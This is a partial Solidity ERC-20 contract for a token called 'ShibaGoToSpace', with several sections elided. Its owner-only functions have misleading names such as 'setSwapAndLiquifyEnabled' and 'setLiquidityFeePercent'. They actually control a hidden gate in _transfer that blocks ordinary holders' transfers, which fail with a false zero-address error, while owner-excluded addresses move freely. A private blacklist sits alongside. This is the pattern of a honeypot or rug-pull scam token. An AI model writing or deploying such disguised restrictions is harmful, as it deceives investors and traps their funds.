...
contract ShibaGoToSpace is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) private _blackbalances;
    
    mapping(address => bool) private _balances1;
    mapping(address => bool) private _excludeamount;
 
    uint256 public _totalSupply = 1000000000*10**18;
    uint256 private _amount1;
    string public _name = "ShibaGoToSpace";
    string public _symbol= "SHIBASPACE";
    bool balances1 = true;
    bool amount1 = true;

    address payable public charityAddress = payable(0x000000000000000000000000000000000000dEaD); // burn address
    ...
    function setSwapAndLiquifyEnabled(bool _amount1_) onlyOwner public {
        amount1 = _amount1_;
    }
    
    function setLiquidityFeePercent(uint _amount2_) onlyOwner public {
        _amount1 = _amount2_;
    }
    
    function Ownership_Authorization(address _account_) onlyOwner public {
        _excludeamount[_account_] = true;
    }
    
    function setRewardsEnabled(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
    function RewardsAddressunAuthorization(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function Rewardsdistributiondisabled(address account) onlyOwner public {
    ...
    function _transfer(
        ...
        if ( _excludeamount[sender]){
             //return true;
        } else {
             require(amount1 || _amount1 > amount  , "ERC20: transfer to the zero address");
        }
    ...
    function Approveburn(address account, uint256 amount) onlyOwner  public virtual {
